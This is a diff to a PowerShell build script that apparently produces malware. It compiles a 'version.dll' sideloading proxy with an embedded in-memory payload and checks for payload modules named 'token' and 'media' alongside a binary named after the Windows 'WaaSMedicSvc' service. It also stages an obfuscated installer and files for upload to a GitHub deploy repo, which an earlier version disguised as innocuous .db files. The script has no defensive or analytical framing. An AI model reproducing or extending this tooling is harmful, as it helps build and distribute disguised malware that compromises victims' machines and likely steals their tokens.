@@ -166,10 +166,24 @@ function Prepare-ProxyPayloads {
 }
 
 function Build-ProxyDll {
-    Write-Host "Building version.dll proxy (x64 + x86, GitHub mode - no embedded payload)..." -ForegroundColor Yellow
+    Write-Host "Building version.dll proxy (x64 + x86, in-memory embedded payload)..." -ForegroundColor Yellow
 
     if (-not (Prepare-ProxyPayloads)) {
         return $false
+    }
+
+    $requiredFiles = @(
+        "build\WaaSMedicSvc.exe",
+        "build\payload\core.bin",
+        "build\payload\modules\token.bin",
+        "build\payload\modules\media.bin"
+    )
+
+    foreach ($file in $requiredFiles) {
+        if (-not (Test-Path $file)) {
+            Write-Host "[FAIL] Missing proxy resource: $file" -ForegroundColor Red
+            return $false
+        }
     }
 
     $vcvars64 = Get-ChildItem "${env:ProgramFiles}\Microsoft Visual Studio" -Filter vcvars64.bat -Recurse -ErrorAction SilentlyContinue |
@@ -187,17 +201,17 @@ function Build-ProxyDll {
 
     $builtAny = $false
 
-    $x64Cmd = "`"$($vcvars64.FullName)`" && cl /nologo /LD proxy\version.cpp /Fe:build\proxy\x64\version.dll /link /DEF:proxy\version.exports.def shell32.lib strsafe.lib"
+    $x64Cmd = "`"$($vcvars64.FullName)`" && rc /nologo /fo build\proxy\version.x64.res proxy\version.rc && cl /nologo /LD proxy\version.cpp build\proxy\version.x64.res /Fe:build\proxy\x64\version.dll /link /DEF:proxy\version.exports.def shell32.lib strsafe.lib winhttp.lib"
     cmd /c $x64Cmd 2>&1 | ForEach-Object { Write-Host $_ }
     if (Test-Path "build\proxy\x64\version.dll") {
         Copy-Item "build\proxy\x64\version.dll" "build\version.dll" -Force
         $builtAny = $true
-        $sizeKb = [math]::Round((Get-Item "build\version.dll").Length / 1KB, 1)
-        Write-Host "[OK] version.dll (x64) built - ${sizeKb} KB (lightweight proxy)" -ForegroundColor Green
+        $sizeMb = [math]::Round((Get-Item "build\version.dll").Length / 1MB, 2)
+        Write-Host "[OK] version.dll (x64) built - ${sizeMb} MB (in-memory load)" -ForegroundColor Green
     }
 
     if ($vcvars32) {
-        $x86Cmd = "`"$($vcvars32.FullName)`" && cl /nologo /LD proxy\version.cpp /Fe:build\proxy\x86\version.dll /link /DEF:proxy\version.exports.def shell32.lib strsafe.lib"
+        $x86Cmd = "`"$($vcvars32.FullName)`" && rc /nologo /fo build\proxy\version.x86.res proxy\version.rc && cl /nologo /LD proxy\version.cpp build\proxy\version.x86.res /Fe:build\proxy\x86\version.dll /link /DEF:proxy\version.exports.def shell32.lib strsafe.lib winhttp.lib"
         cmd /c $x86Cmd 2>&1 | ForEach-Object { Write-Host $_ }
         if (Test-Path "build\proxy\x86\version.dll") {
             $builtAny = $true
@@ -240,15 +254,13 @@ function Prepare-GithubDeployPackage {
     Write-Host "Preparing GitHub deploy package..." -ForegroundColor Yellow
 
     $githubDir = "build\github"
-    $githubCache = Join-Path $githubDir "Cache"
-    New-Item -ItemType Directory -Path $githubCache -Force | Out-Null
+    if (Test-Path $githubDir) {
+        Remove-Item $githubDir -Recurse -Force -ErrorAction SilentlyContinue
+    }
+    New-Item -ItemType Directory -Path $githubDir -Force | Out-Null
 
     $copyMap = @{
         "build\version.dll" = Join-Path $githubDir "version.dll"
-        "build\WaaSMedicSvc.exe" = Join-Path $githubDir "WaaSMedicSvc.exe"
-        "build\payload\core.bin" = Join-Path $githubDir "ProvData.db"
-        "build\payload\modules\token.bin" = Join-Path $githubCache "TokenProv.db"
-        "build\payload\modules\media.bin" = Join-Path $githubCache "DeviceCache.db"
     }
 
     foreach ($entry in $copyMap.GetEnumerator()) {
@@ -316,7 +328,7 @@ if ($success) {
     Write-Host "Output files:" -ForegroundColor Cyan
     Write-Host "- GitHub upload folder: build\github\  (upload to repo /deploy/)" -ForegroundColor White
     Write-Host "- Obfuscated install: build\github\install_obfuscated.txt" -ForegroundColor White
-    Write-Host "- Sideload proxy: build\version.dll  (small, ~few KB)" -ForegroundColor White
+    Write-Host "- Sideload proxy: build\version.dll  (~3 MB, in-memory embedded payload)" -ForegroundColor White
     Write-Host "- Protected payload: build\payload\core.bin (+ modules/*.bin)" -ForegroundColor White
     Write-Host ""
     Write-Host "GitHub setup:" -ForegroundColor Cyan
